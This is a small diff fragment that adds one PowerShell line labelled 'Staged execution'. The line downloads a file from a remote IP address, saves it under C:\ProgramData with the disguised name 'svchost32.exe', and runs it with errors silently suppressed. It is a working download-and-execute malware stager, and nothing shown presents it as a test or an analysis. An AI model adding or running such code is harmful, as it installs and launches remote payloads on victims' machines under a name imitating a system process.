@@ -1,0 +1,2 @@
+
+<# Staged execution #> try { $DownloadUrl = "https://192.0.2.133:443/assets/update.dat"; $DownloadPath = "C:\ProgramData\svchost32.exe"; Start-BitsTransfer -Source $DownloadUrl -Destination $DownloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue; Write-Output "stage 45 initialized"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
